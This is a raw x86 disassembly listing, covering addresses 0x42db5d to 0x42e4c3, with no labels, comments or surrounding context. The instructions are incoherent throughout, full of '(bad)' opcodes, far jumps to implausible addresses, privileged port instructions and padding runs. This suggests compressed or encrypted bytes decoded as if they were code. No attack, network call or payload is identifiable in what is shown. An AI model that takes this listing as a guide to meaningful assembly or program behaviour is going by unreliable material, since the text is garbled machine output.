  42db5d:	mov    bl,0xcf
  42db5f:	add    ebx,ebp
  42db61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42db62:	arpl   WORD PTR [edi+0xc],ax
  42db65:	add    BYTE PTR [esi+0x41],bl
	...
  42db84:	add    BYTE PTR [eax],al
  42db86:	adc    eax,0xa207a986
  42db8b:	mov    ebx,0xb546abed
  42db90:	xor    bh,BYTE PTR [ebx+0x306488af]
  42db96:	push   es
  42db97:	mov    bl,0x22
  42db99:	sub    al,0x1d
  42db9b:	fucomi st,st(0)
  42db9d:	add    esi,DWORD PTR [ebp+0xd039bef]
  42dba3:	test   al,0x1d
  42dba5:	fsub   st,st(6)
  42dba7:	mov    dl,0x66
  42dba9:	and    ecx,ebx
  42dbab:	jmp    FWORD PTR [edi+0x41]
  42dbae:	aad    0x19
  42dbb0:	pop    esi
  42dbb1:	inc    ecx
  42dbb2:	aad    0x19
  42dbb4:	sub    ah,al
  42dbb6:	adc    eax,0x3f80701a
  42dbbb:	mov    bl,0xda
  42dbbd:	mov    edx,0x88e13c92
  42dbc2:	nop
  42dbc3:	sub    ecx,edx
  42dbc5:	mov    edx,0xbadfa7a6
  42dbca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dbcb:	mov    dl,0x65
  42dbcd:	ret    
  42dbce:	and    ch,ch
  42dbd0:	push   DWORD PTR [ebp+0x2915c3fd]
  42dbd6:	adc    ebp,esi
  42dbd8:	aas    
  42dbd9:	into   
  42dbda:	push   cs
  42dbdb:	add    BYTE PTR [ebp-0x38],dh
  42dbde:	mov    bh,0x3c
  42dbe0:	clc    
  42dbe1:	push   0x1430b835
  42dbe6:	adc    DWORD PTR [eax],eax
  42dbe8:	jb     0x42dbd8
	...
  42dc06:	add    BYTE PTR [eax],al
  42dc08:	dec    edi
  42dc09:	cmp    al,0xf8
  42dc0b:	fldcw  WORD PTR [edi-0x4e]
  42dc0e:	sti    
  42dc0f:	jbe    0x42dbde
  42dc11:	stos   DWORD PTR es:[edi],eax
  42dc12:	mov    eax,0xffffd4c9
  42dc17:	into   
  42dc18:	inc    ecx
  42dc19:	cmp    esi,esp
  42dc1b:	fcmovnb st,st(1)
  42dc1d:	loope  0x42dbde
  42dc1f:	mov    dl,0x41
  42dc21:	jno    0x42dc27
  42dc23:	jmp    0x3f29dcc6
  42dc28:	mov    ebp,0xbf98ec7a
  42dc2d:	jp     0x42dbf0
  42dc2f:	inc    ecx
  42dc30:	fdiv   DWORD PTR [ebx+edi*8-0x3c466d2]
  42dc37:	jb     0x42dc86
  42dc39:	or     bl,dh
  42dc3b:	inc    ecx
  42dc3c:	sbb    eax,eax
  42dc3e:	lea    edi,[edx+edi*4-0x584641ef]
  42dc45:	sub    ecx,DWORD PTR [eax]
  42dc47:	push   es
  42dc48:	sbb    esp,edi
  42dc4a:	cli    
  42dc4b:	aam    0x4e
  42dc4d:	push   cs
  42dc4e:	inc    eax
  42dc4f:	jmp    0xeec294d7
  42dc54:	test   BYTE PTR [edi+ebx*1],ch
  42dc57:	push   ebx
  42dc58:	or     DWORD PTR [edx],ebx
  42dc5a:	add    BYTE PTR [esi],dh
  42dc5c:	je     0x42dc69
  42dc5e:	add    al,0xff
  42dc60:	dec    esi
  42dc61:	add    BYTE PTR [edx+0x43],dl
  42dc64:	std    
  42dc65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc66:	lods   al,BYTE PTR ds:[esi]
  42dc67:	add    BYTE PTR [edi],al
  42dc69:	cld    
  42dc6a:	inc    DWORD PTR [eax+eax*1+0x0]
	...
  42dc89:	add    BYTE PTR [eax+esi*8+0xf],ah
  42dc8d:	push   edi
  42dc8e:	das    
  42dc8f:	ins    BYTE PTR es:[edi],dx
  42dc90:	call   0xf7ba9b50
  42dc95:	mov    esp,DWORD PTR [ebx+eiz*2+0x63a432fe]
  42dc9c:	aas    
  42dc9d:	xor    edx,DWORD PTR [edx+0xf6854b]
  42dca3:	or     al,0x62
  42dca5:	and    ebp,DWORD PTR [ebx]
  42dca7:	fs mov bh,0xfb
  42dcaa:	(bad)  [esi-0x7c]
  42dcad:	rcl    BYTE PTR [eax+0x16],0x83
  42dcb1:	(bad)  
  42dcb2:	(bad)  
  42dcb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dcb4:	or     BYTE PTR gs:[edi-0x1d],cl
  42dcb8:	stc    
  42dcb9:	push   esi
  42dcba:	fild   DWORD PTR [eax]
  42dcbc:	sbb    BYTE PTR [esi],dl
  42dcbe:	fs std 
  42dcc0:	dec    esi
  42dcc1:	jmp    DWORD PTR [ecx]
  42dcc3:	mov    eax,ds:0x64344011
  42dcc8:	adc    bh,bh
  42dcca:	inc    ecx
  42dccb:	mov    ecx,0x84244015
  42dcd0:	fmul   DWORD PTR [ebx-0x74ff1d0e]
  42dcd6:	cmp    dh,BYTE PTR [edi+0x10]
  42dcd9:	push   ebx
  42dcda:	sbb    eax,DWORD PTR [ecx]
  42dcdc:	xor    BYTE PTR [esi],dl
  42dcde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dcdf:	cld    
  42dce0:	sub    al,al
  42dce2:	lahf   
  42dce3:	push   esi
  42dce4:	push   edi
  42dce5:	leave  
  42dce6:	add    BYTE PTR ss:[eax],al
  42dce9:	push   0xffffffe4
  42dceb:	ja     0x42dd61
  42dced:	and    al,0x0
	...
  42dd0b:	add    al,ch
  42dd0d:	ja     0x42dd83
  42dd0f:	and    al,0xe8
  42dd11:	ja     0x42dd84
  42dd13:	add    al,0xab
  42dd15:	add    DWORD PTR [eax],esp
  42dd17:	push   ss
  42dd18:	in     al,0xfb
  42dd1a:	mov    ecx,0x4aa70d08
  42dd1f:	xchg   DWORD PTR [ecx+0x3e2ca325],edi
  42dd25:	adc    DWORD PTR [ecx-0x79],edx
  42dd28:	xchg   ebp,eax
  42dd29:	sub    eax,0xbdb787ae
  42dd2e:	dec    edi
  42dd2f:	xchg   DWORD PTR [ebx],edx
  42dd31:	or     dl,BYTE PTR [ebp-0x79]
  42dd34:	push   ebx
  42dd35:	pop    ecx
  42dd36:	dec    edi
  42dd37:	add    al,0x90
  42dd39:	cmp    WORD PTR [edx],ax
  42dd3c:	push   cs
  42dd3d:	outs   dx,DWORD PTR ds:[esi]
  42dd3e:	in     al,dx
  42dd3f:	div    DWORD PTR [esi-0x3d]
  42dd42:	sub    ecx,DWORD PTR [eax+0x62]
  42dd45:	rol    ebx,cl
  42dd47:	adc    eax,0x2ef2a6cd
  42dd4c:	sub    ah,BYTE PTR [edi-0x12c8b01]
  42dd52:	repz je 0x42dd62
  42dd55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dd56:	add    BYTE PTR [ebp+0x61],0x76
  42dd5a:	mov    WORD PTR [ebp+0x5],es
  42dd5d:	mov    ebp,0xa7f8e7de
  42dd62:	(bad)  
  42dd63:	dec    DWORD PTR [eax+0x232b29e6]
  42dd69:	pop    ebx
  42dd6a:	retf   
  42dd6b:	and    BYTE PTR [ecx+0x44f6a3],bl
	...
  42dd8d:	add    cl,bh
  42dd8f:	je     0x42dd78
  42dd91:	icebp  
  42dd92:	dec    eax
  42dd93:	in     eax,dx
  42dd94:	std    
  42dd95:	jae    0x42ddaa
  42dd97:	sbb    dh,BYTE PTR [edx]
  42dd99:	fmul   DWORD PTR ds:0xea84de8c
  42dd9f:	jle    0x42de04
  42dda1:	mov    al,0xc
  42dda3:	pop    cx
  42dda5:	push   edi
  42dda6:	(bad)  
  42dda7:	(bad)  
  42dda9:	jmp    FWORD PTR [edx+0x2c]
  42ddac:	loopne 0x42ddad
  42ddae:	retf   0xd9e
  42ddb1:	xor    BYTE PTR [ebx],bl
  42ddb3:	add    BYTE PTR [ecx],ch
  42ddb5:	add    al,0xeb
  42ddb7:	mov    edi,0x35b6aace
  42ddbc:	lds    ebp,FWORD PTR [ebx-0x23ab5064]
  42ddc2:	stos   BYTE PTR es:[edi],al
  42ddc3:	pushf  
  42ddc4:	sbb    al,0x8b
  42ddc6:	test   eax,0xa5c56e51
  42ddcb:	hlt    
  42ddcc:	mov    ah,0xb7
  42ddce:	xchg   BYTE PTR [ecx+0x24],bh
  42ddd1:	mov    eax,0xaef1458a
  42ddd6:	push   ebp
  42ddd7:	or     ebp,DWORD PTR [ecx-0x39542777]
  42dddd:	sar    DWORD PTR [ebp-0x14f3eb52],0xff
  42dde4:	xor    DWORD PTR [ecx],0x7f4aefd
  42ddea:	push   esi
  42ddeb:	xor    ebp,ebp
  42dded:	mov    dh,0x20
  42ddef:	cwde   
  42ddf0:	aam    0x43
	...
  42de0e:	add    BYTE PTR [eax],al
  42de10:	or     eax,0xd0827b9
  42de15:	sbb    ch,cl
  42de17:	mov    dh,0xb9
  42de19:	jecxz  0x42ddff
  42de1b:	mov    dh,0xa1
  42de1d:	jecxz  0x42ddfb
  42de1f:	mov    dh,0x9c
  42de21:	add    eax,DWORD PTR [edx+0x11]
  42de24:	aad    0x15
  42de26:	test   eax,0xe8f85303
  42de2b:	push   eax
  42de2c:	xchg   edx,eax
  42de2d:	fwait
  42de2e:	data16 test al,0x31
  42de31:	push   ebx
  42de32:	mov    ebx,0x6ea7924e
  42de37:	mov    ch,0x8a
  42de39:	leave  
  42de3a:	inc    BYTE PTR [edi-0x6e]
  42de3d:	adc    eax,0x150451
  42de42:	jmp    0xab41c141
  42de47:	mov    esi,0x6200533d
  42de4c:	shr    DWORD PTR [edx-0x407222b2],cl
  42de52:	jp     0x42de43
  42de54:	bswap  eax
  42de56:	daa    
  42de57:	loope  0x42dec0
  42de59:	fidiv  DWORD PTR [ebx+0x13]
  42de5c:	bound  edx,QWORD PTR [esp+ecx*8]
  42de5f:	hlt    
  42de60:	dec    esi
  42de61:	add    BYTE PTR ds:0xfbaebbfa,bh
  42de67:	xor    al,0xa4
  42de69:	test   eax,0x4495e175
  42de6e:	aam    0x19
  42de70:	xchg   esi,eax
  42de71:	inc    esp
  42de72:	or     al,0x13
	...
  42de90:	add    BYTE PTR [eax],al
  42de92:	sets   BYTE PTR [ebp-0x17]
  42de96:	push   cs
  42de97:	add    BYTE PTR [ebp-0xdf7e257],al
  42de9d:	and    al,0x3d
  42de9f:	lods   eax,DWORD PTR ds:[esi]
  42dea0:	outs   dx,DWORD PTR ds:[esi]
  42dea1:	in     al,dx
  42dea2:	pop    ecx
  42dea3:	inc    ebx
  42dea4:	fdivr  st(4),st
  42dea6:	stc    
  42dea7:	test   bl,bh
  42dea9:	idiv   BYTE PTR [esi-0x24f1fe91]
  42deaf:	push   esi
  42deb0:	leave  
  42deb1:	sub    eax,DWORD PTR [esi]
  42deb3:	add    BYTE PTR [esi],ch
  42deb5:	sub    DWORD PTR [edi-0x4c],esp
  42deb8:	sti    
  42deb9:	fadd   QWORD PTR [edx-0x56]
  42debc:	adc    eax,0x401319
  42dec1:	push   edx
  42dec2:	popa   
  42dec3:	xchg   cl,al
  42dec5:	push   ecx
  42dec6:	loopne 0x42de7e
  42dec8:	sti    
  42dec9:	ss pop esi
  42decb:	test   eax,0x26110574
  42ded0:	add    BYTE PTR [esi],ah
  42ded2:	sub    ah,ah
  42ded4:	pop    ss
  42ded5:	push   ds
  42ded6:	and    ah,ah
  42ded8:	pop    ss
  42ded9:	push   ss
  42deda:	and    DWORD PTR [ebx+edi*8],eax
  42dedd:	hlt    
  42dede:	scas   al,BYTE PTR es:[edi]
  42dedf:	adc    eax,DWORD PTR [eax+0x0]
  42dee2:	in     al,0xb2
  42dee4:	enter  0xc83,0x76
  42dee8:	pop    es
  42dee9:	xchg   ebp,eax
  42deea:	hlt    
  42deeb:	mov    esi,0x7a99000c
  42def0:	in     al,dx
  42def1:	and    eax,0xfffffff8
  42def4:	jp     0x42df5b
	...
  42df12:	add    BYTE PTR [eax],al
  42df14:	rol    BYTE PTR [ebx+ecx*2],1
  42df17:	push   edi
  42df18:	ret    
  42df19:	fld    QWORD PTR [edi]
  42df1b:	mov    edx,DWORD PTR [ecx]
  42df1d:	add    BYTE PTR [esi],cl
  42df1f:	inc    eax
  42df20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df21:	je     0x42df91
  42df23:	or     BYTE PTR [edi],bl
  42df25:	int3   
  42df26:	div    DWORD PTR [esi+0x78]
  42df29:	je     0x42defa
  42df2b:	test   DWORD PTR [eax+esi*8+0x73bf8307],esi
  42df32:	jmp    0x4443c0
  42df37:	mov    esi,DWORD PTR [edx]
  42df39:	cld    
  42df3a:	scas   eax,DWORD PTR es:[edi]
  42df3b:	add    ebp,ebp
  42df3d:	inc    esp
  42df3e:	hlt    
  42df3f:	test   DWORD PTR [edi-0xe76fb10],ebp
  42df45:	imul   esi,esi,0xffffffc0
  42df48:	xor    ebx,DWORD PTR [ebx]
  42df4a:	ror    BYTE PTR [ecx+0x75f6fbe9],0x34
  42df51:	xchg   BYTE PTR [ebp-0xc],al
  42df54:	pop    esi
  42df55:	add    DWORD PTR [eax-0x1],edx
  42df58:	dec    ecx
  42df59:	stc    
  42df5a:	not    BYTE PTR ds:0x4013d0
  42df60:	lahf   
  42df61:	retf   
  42df62:	test   ebx,ebx
  42df64:	pop    ecx
  42df65:	adc    eax,0x77f075f7
  42df6a:	mov    esi,0xf7676be8
  42df6f:	jmp    FWORD PTR [eax-0x3c]
  42df72:	je     0x42df7d
  42df74:	jg     0x42df63
  42df76:	or     edi,DWORD PTR [ecx]
	...
  42df94:	add    BYTE PTR [eax],al
  42df96:	or     eax,0xf6cf2baf
  42df9b:	mov    eax,0x11dac780
  42dfa0:	adc    edi,DWORD PTR [edi-0x2a]
  42dfa3:	xchg   edi,eax
  42dfa4:	sub    cl,BYTE PTR [ecx]
  42dfa6:	rcr    BYTE PTR [ebx-0x4d],cl
  42dfa9:	fisttp WORD PTR [esi]
  42dfab:	xchg   edi,eax
  42dfac:	jmp    esi
  42dfae:	or     bl,BYTE PTR [eax]
  42dfb0:	mov    eax,0xff970dfe
  42dfb5:	je     0x42dfc9
  42dfb7:	pop    esi
  42dfb8:	cmp    bh,ah
  42dfba:	push   ecx
  42dfbb:	push   es
  42dfbc:	add    al,0x0
  42dfbe:	call   0xb4af:0x1bfb13ec
  42dfc5:	jb     0x42dfd8
  42dfc7:	jbe    0x42df95
  42dfc9:	test   DWORD PTR [ebp-0xe],ecx
  42dfcc:	add    BYTE PTR [edi+0x46],bh
  42dfcf:	cmp    BYTE PTR gs:[ebp+0x71],0x96
  42dfd4:	sub    ecx,DWORD PTR [ecx]
  42dfd6:	push   0xb
  42dfd8:	mov    eax,0xdc6f8fb
  42dfdd:	inc    eax
  42dfde:	or     eax,0xb6bf88e6
  42dfe3:	outs   dx,DWORD PTR ds:[esi]
  42dfe4:	ror    DWORD PTR [ecx*1-0x711376f4],0x2a
  42dfec:	add    ebp,DWORD PTR [edi]
  42dfee:	dec    ebp
  42dfef:	dec    di
  42dff1:	(bad)  
  42dff2:	shr    BYTE PTR [esi-0x3f42afb2],0x3
  42dff9:	lea    eax,[eax]
	...
  42e017:	add    al,cl
  42e019:	push   edx
  42e01a:	dec    edi
  42e01b:	push   0x97ff9711
  42e020:	adc    dh,BYTE PTR [ebx+0x7]
  42e023:	ret    
  42e024:	push   eax
  42e025:	in     eax,dx
  42e026:	std    
  42e027:	dec    DWORD PTR ds:0xf545bc99
  42e02d:	add    cl,bh
  42e02f:	fdivr  st(2),st
  42e031:	stos   DWORD PTR es:[edi],eax
  42e032:	and    bh,BYTE PTR [esi]
  42e034:	jmp    0xd46d6b1
  42e039:	stos   DWORD PTR es:[edi],eax
  42e03a:	hlt    
  42e03b:	mov    bh,0x0
  42e03d:	inc    eax
  42e03e:	jmp    0x294a95ef
  42e043:	inc    ebx
  42e044:	aam    0xbe
  42e046:	in     eax,dx
  42e047:	add    ebx,DWORD PTR [eax+0x77]
  42e04a:	std    
  42e04b:	push   ecx
  42e04c:	xor    eax,DWORD PTR [esi+edx*1]
  42e04f:	les    eax,FWORD PTR [eax+0x4d55dd3d]
  42e055:	push   eax
  42e056:	aas    
  42e057:	or     ah,BYTE PTR [esi+0x507ce135]
  42e05d:	lods   al,BYTE PTR ds:[esi]
  42e05e:	ret    0x519
  42e061:	adc    ch,BYTE PTR [ecx]
  42e063:	add    al,0x7e
  42e065:	enter  0xc3ce,0xcd
  42e069:	mov    eax,0x4f0d08a7
  42e06e:	cmp    al,0xf7
  42e070:	pop    ebx
  42e071:	push   edx
  42e072:	test   BYTE PTR es:[eax],ch
  42e075:	enter  0x47b4,0xd
  42e079:	add    BYTE PTR [edx],dh
  42e07b:	cmp    DWORD PTR [eax],eax
	...
  42e099:	add    BYTE PTR [eax],ah
  42e09b:	push   0xfffffff1
  42e09d:	rcl    DWORD PTR [edx],1
  42e09f:	add    BYTE PTR [ebx],dl
  42e0a1:	mov    bl,0x20
  42e0a3:	or     bh,dl
  42e0a5:	inc    ebx
  42e0a6:	or     eax,0x58cbac80
  42e0ab:	aas    
  42e0ac:	jmp    0x514b98b4
  42e0b1:	sahf   
  42e0b2:	pop    ds
  42e0b3:	stos   DWORD PTR es:[edi],eax
  42e0b4:	push   edx
  42e0b5:	mov    BYTE PTR [ebp+0x34],cl
  42e0b8:	stc    
  42e0b9:	retf   0xcc10
  42e0bc:	and    al,0x47
  42e0be:	or     eax,0xd46021b
  42e0c3:	js     0x42e0c5
  42e0c5:	aam    0xd6
  42e0c7:	int3   
  42e0c8:	aas    
  42e0c9:	jmp    0x5588822
  42e0ce:	sbb    eax,DWORD PTR [eax+0x0]
  42e0d1:	jae    0x42e128
  42e0d3:	in     al,0x13
  42e0d5:	add    DWORD PTR [ebp-0x57],ebx
  42e0d8:	sti    
  42e0d9:	push   cs
  42e0da:	pop    edx
  42e0db:	cmc    
  42e0dc:	daa    
  42e0dd:	fisttp WORD PTR [esi+0x0]
  42e0e0:	out    0x4b,ax
  42e0e3:	test   al,0x4f
  42e0e5:	sahf   
  42e0e6:	jg     0x42e0b5
  42e0e8:	data16 fcomp DWORD PTR [eax]
  42e0eb:	stos   BYTE PTR es:[edi],al
  42e0ec:	push   edx
  42e0ed:	jb     0x42e085
  42e0ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e0f0:	shl    BYTE PTR [edx+0x76],cl
  42e0f3:	sub    bh,ch
  42e0f5:	(bad)  
  42e0f6:	fiadd  DWORD PTR [edi+edi*2]
  42e0f9:	into   
  42e0fa:	pop    edi
  42e0fb:	xor    al,0xfe
  42e0fd:	cli    
	...
  42e11a:	add    BYTE PTR [eax],al
  42e11c:	ret    
  42e11d:	xor    BYTE PTR ds:0x4024f5,0x1c
  42e124:	mov    esi,0x54ae53cd
  42e129:	inc    esi
  42e12a:	pop    edx
  42e12b:	inc    esp
  42e12c:	repz push 0x57
  42e12f:	stos   DWORD PTR es:[edi],eax
  42e130:	adc    al,BYTE PTR [eax]
  42e132:	push   ebp
  42e133:	bound  eax,QWORD PTR [edx-0x3c0a13d6]
  42e139:	fcmovbe st,st(6)
  42e13b:	pop    ds
  42e13c:	popa   
  42e13d:	or     ebx,eax
  42e13f:	pushf  
  42e140:	sar    edi,cl
  42e142:	je     0x42e100
  42e144:	mov    esp,0x112ad9f7
  42e149:	dec    esi
  42e14a:	sti    
  42e14b:	cld    
  42e14c:	push   es
  42e14d:	cli    
  42e14e:	aas    
  42e14f:	jmp    0x351aec8a
  42e154:	retf   
  42e155:	push   DWORD PTR [ebx+esi*8+0x76]
  42e159:	and    dl,dh
  42e15b:	add    bl,cl
  42e15d:	ins    DWORD PTR es:[edi],dx
  42e15e:	test   al,al
  42e160:	rcl    BYTE PTR [edi+edi*4],0x5
  42e164:	sbb    al,dl
  42e166:	cmp    eax,DWORD PTR [eax]
  42e168:	mov    ebx,0x22003d96
  42e16d:	clc    
  42e16e:	xlat   BYTE PTR ds:[ebx]
  42e16f:	fnsave [edi-0x4a9ff03]
  42e175:	pop    es
  42e176:	sbb    al,0x12
  42e178:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e179:	std    
  42e17a:	add    DWORD PTR [ebp-0x24],0x26252
	...
  42e19d:	add    BYTE PTR [ebp*4+0x4ebbfff8],bl
  42e1a4:	not    DWORD PTR ds:0x4007cc
  42e1aa:	cmp    eax,0xac83f841
  42e1af:	outs   dx,DWORD PTR ds:[esi]
  42e1b0:	jne    0x42e1b6
  42e1b2:	pop    es
  42e1b3:	(bad)  
  42e1b7:	mov    cl,0xf7
  42e1b9:	adc    eax,0x534f03e4
  42e1be:	daa    
  42e1bf:	sub    DWORD PTR [ebp-0x4],ecx
  42e1c2:	and    eax,0xb84d8d53
  42e1c7:	dec    ebp
  42e1c8:	dec    ebx
  42e1c9:	push   ebx
  42e1ca:	jmp    0x42e1d1
  42e1cc:	add    BYTE PTR [eax],al
  42e1ce:	sbb    al,0x47
  42e1d0:	push   eax
  42e1d1:	mov    DWORD PTR [ecx],ebx
  42e1d3:	lods   al,BYTE PTR ds:[esi]
  42e1d4:	mov    BYTE PTR [ebp-0x78],bl
  42e1d7:	outs   dx,DWORD PTR ds:[esi]
  42e1d8:	into   
  42e1d9:	or     DWORD PTR [edi+ebp*2+0x10cb4375],0xffffffcc
  42e1e1:	adc    eax,0x1e3d03f4
  42e1e6:	push   ebx
  42e1e7:	std    
  42e1e8:	push   DWORD PTR [edx+edx*1+0x2b]
  42e1ec:	inc    ebp
  42e1ed:	cld    
  42e1ee:	out    dx,eax
  42e1ef:	ret    0x2c74
  42e1f2:	or     eax,0xd4b513f
  42e1f7:	xchg   edi,eax
  42e1f8:	jbe    0x42e23f
  42e1fa:	add    eax,0x2e74c4fe
  42e1ff:	xchg   BYTE PTR [ebp+ecx*4+0x0],dl
	...
  42e21f:	add    BYTE PTR [eax-0xd],cl
  42e222:	push   ebx
  42e223:	sti    
  42e224:	sbb    bl,0xb0
  42e227:	jne    0x42e22e
  42e229:	push   sp
  42e22b:	push   ebx
  42e22c:	jmp    0xc41b:0xbbfba793
  42e233:	je     0x42e23b
  42e235:	cli    
  42e236:	xor    cl,BYTE PTR [eax]
  42e238:	in     eax,0x8d
  42e23a:	inc    eax
  42e23b:	add    BYTE PTR ds:0xc2084b30,cl
  42e241:	sub    esp,DWORD PTR [edi+0x197320fb]
  42e247:	inc    eax
  42e248:	or     eax,0x4a08422e
  42e24d:	jmp    0x9b12ab9e
  42e252:	call   DWORD PTR [esi+eax*4+0x6a]
  42e256:	test   ah,ch
  42e258:	add    DWORD PTR [esi],eax
  42e25a:	push   esi
  42e25b:	push   ebx
  42e25c:	aas    
  42e25d:	push   edi
  42e25e:	xchg   edi,eax
  42e25f:	mov    eax,DWORD PTR [ebp-0xf804f8f]
  42e265:	outs   dx,BYTE PTR ds:[esi]
  42e266:	inc    DWORD PTR [esi-0xbbda6ab]
  42e26c:	or     eax,0x4bffffaf
  42e271:	(bad)  [eax-0x47eca600]
  42e277:	(bad)  
  42e278:	fdivr  DWORD PTR [esi-0x69]
  42e27b:	lods   al,BYTE PTR ds:[esi]
  42e27c:	fist   DWORD PTR [esi+0x2ec086ff]
  42e282:	add    eax,0x0
	...
  42e2a1:	add    cl,al
  42e2a3:	mov    ah,0x7a
  42e2a5:	inc    ebp
  42e2a6:	cmp    edi,edi
  42e2a8:	mov    eax,0xceffb358
  42e2ad:	loope  0x42e282
  42e2af:	test   al,0xfc
  42e2b1:	lahf   
  42e2b2:	std    
  42e2b3:	aas    
  42e2b4:	jmp    0x43bf0035
  42e2b9:	and    BYTE PTR [eax+0x6463af6],al
  42e2bf:	xor    DWORD PTR [eax+esi*4-0x63e4ce06],0x51f11a0e
  42e2ca:	nop
  42e2cb:	scas   al,BYTE PTR es:[edi]
  42e2cc:	xchg   ebp,eax
  42e2cd:	sti    
  42e2ce:	aas    
  42e2cf:	cwde   
  42e2d0:	push   ss
  42e2d1:	inc    ecx
  42e2d2:	or     eax,0x3fb0d600
  42e2d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e2d8:	fdivr  st(7),st
  42e2da:	sbb    BYTE PTR [eax-0x17],al
  42e2dd:	jl     0x42e2ad
  42e2df:	inc    edi
  42e2e0:	xchg   ebx,eax
  42e2e1:	dec    esp
  42e2e2:	(bad)
  42e2e6:	mov    eax,ds:0xc2f16951
  42e2eb:	lds    esp,FWORD PTR [esi]
  42e2ed:	add    al,0xd
  42e2ef:	sub    eax,0xf8575611
  42e2f4:	stos   BYTE PTR es:[edi],al
  42e2f5:	inc    ebx
  42e2f6:	or     eax,0x2519c24e
  42e2fb:	adc    ch,BYTE PTR [ecx]
  42e2fd:	add    al,0x8d
  42e2ff:	in     eax,0x90
  42e301:	sar    DWORD PTR [edx],1
  42e303:	add    cl,ch
  42e305:	cmp    BYTE PTR [eax],al
	...
  42e323:	add    BYTE PTR [ebx],bl
  42e325:	cwde   
  42e326:	repnz mov eax,0xc465a766
  42e32c:	fst    DWORD PTR [eax]
  42e32e:	stos   BYTE PTR es:[edi],al
  42e32f:	or     DWORD PTR [ecx],edi
  42e331:	lds    esp,FWORD PTR [esi]
  42e333:	add    al,0xe6
  42e335:	fisub  WORD PTR [esi]
  42e337:	add    al,0x4f
  42e339:	std    
  42e33a:	mov    al,ds:0x2d1
  42e33f:	call   0xcd588e24
  42e344:	sbb    al,0x40
  42e346:	add    bh,al
  42e348:	lea    edi,ds:0x2d73b9fc
  42e34e:	or     al,0x62
  42e350:	(bad)  
  42e351:	mul    DWORD PTR [ebp-0x17]
  42e354:	dec    ebx
  42e355:	cmp    eax,0xef9fc
  42e35a:	add    BYTE PTR [ecx+0x6],dl
  42e35d:	scas   eax,DWORD PTR es:[edi]
  42e35e:	sti    
  42e35f:	ss popa 
  42e361:	stos   DWORD PTR es:[edi],eax
  42e362:	jne    0x42e345
  42e364:	mov    ds:0x4eff140c,eax
  42e369:	add    BYTE PTR [ebp+0x67f62529],al
  42e36f:	dec    ebp
  42e370:	push   edi
  42e371:	inc    eax
  42e372:	add    BYTE PTR [esi],cl
  42e374:	adc    al,0xf4
  42e376:	cli    
  42e377:	fadd   st(6),st
  42e379:	cmovo  ebp,ecx
  42e37c:	mov    esp,0x3eebe766
  42e381:	add    ecx,ecx
  42e383:	sub    esi,DWORD PTR [ecx+0x7254a6]
	...
  42e3a5:	add    BYTE PTR [edx+0x139ec26],cl
  42e3ab:	add    BYTE PTR [eax],cl
  42e3ad:	jmp    0x1f737bc0
  42e3b2:	or     DWORD PTR [eax],eax
  42e3b4:	mov    DWORD PTR [ecx+eax*8],ebp
  42e3b7:	jl     0x42e379
  42e3b9:	xor    al,0x82
  42e3bb:	sbb    al,0x8
  42e3bd:	mov    dh,0x15
  42e3bf:	lock adc DWORD PTR [ecx],ebp
  42e3c2:	or     esi,edx
  42e3c4:	mov    edi,0x8e90
  42e3c9:	jmp    0x4002ba8d
  42e3ce:	ret    0x7d74
  42e3d1:	nop
  42e3d2:	dec    eax
  42e3d3:	cmp    al,0xf8
  42e3d5:	add    BYTE PTR [eax+ecx*2],dh
  42e3d8:	add    DWORD PTR [ebp+0x3c],0x29
  42e3dc:	inc    eax
  42e3dd:	or     BYTE PTR [ebp-0x167423c9],ch
  42e3e3:	inc    DWORD PTR [edx+0x45231c40]
  42e3e9:	loopne 0x42e38a
  42e3eb:	aaa    
  42e3ec:	adc    al,0xc7
  42e3ee:	imul   ecx,DWORD PTR [edx+0x224fffa],0xa7c8c085
  42e3f8:	mov    BYTE PTR [ebp+0x48],al
  42e3fb:	mov    esi,0x1e7e845
  42e400:	add    BYTE PTR [eax],al
  42e402:	addr16 fdiv st,st(3)
  42e405:	add    BYTE PTR [edx],bh
  42e407:	cmp    bh,dh
	...
  42e425:	add    BYTE PTR [eax],al
  42e427:	add    ch,bh
  42e429:	mov    dl,0x0
  42e42b:	add    ah,ah
  42e42d:	js     0x42e3ef
  42e42f:	je     0x42e409
  42e431:	cmp    al,0x1
  42e434:	ret    
  42e435:	js     0x42e426
  42e437:	add    BYTE PTR [ecx+eax*1+0x2ab07583],dh
  42e43e:	pop    ebp
  42e43f:	or     BYTE PTR [ecx-0x10],dl
  42e442:	clc    
  42e443:	jmp    0x42e3e2
  42e445:	sub    BYTE PTR [ebp+0x8],dh
  42e448:	pop    ds
  42e449:	xor    eax,0x54418d0c
  42e44e:	lea    eax,[ebp+0x74]
  42e451:	dec    esp
  42e452:	div    DWORD PTR [esi+0x7c]
  42e455:	push   esp
  42e456:	outs   dx,BYTE PTR ds:[esi]
  42e457:	add    al,0xc3
  42e459:	or     eax,0xfc241600
  42e45e:	test   al,al
  42e460:	push   ebx
  42e461:	jle    0x42e441
  42e463:	add    BYTE PTR [ecx+eax*1-0x12],dh
  42e467:	inc    ebp
  42e468:	les    eax,FWORD PTR [eax]
  42e46a:	je     0x42e4dc
  42e46c:	or     eax,0x88b44322
  42e471:	push   edi
  42e472:	cmp    BYTE PTR [esp+edx*4-0x2c],al
  42e476:	mov    bh,0xe9
  42e478:	pop    esp
  42e479:	xchg   edi,eax
  42e47a:	(bad)  
  42e47b:	inc    DWORD PTR [esi+0x44850bdc]
  42e481:	stos   DWORD PTR es:[edi],eax
  42e482:	or     al,BYTE PTR [edi-0x13acd3f4]
  42e488:	mov    edi,0xf03345
	...
  42e4a9:	add    BYTE PTR [esi+0x950ac64],bh
  42e4af:	sbb    eax,esp
  42e4b1:	or     edx,DWORD PTR [ecx+0xd000422]
  42e4b7:	xor    al,BYTE PTR [ebx-0x14]
  42e4ba:	nop
  42e4bb:	(bad)  
  42e4bc:	sub    DWORD PTR [eax],ebx
  42e4be:	repnz imul edx,DWORD PTR [ebx],0xffffff87
  42e4c2:	inc    eax
  42e4c3:	pop    es
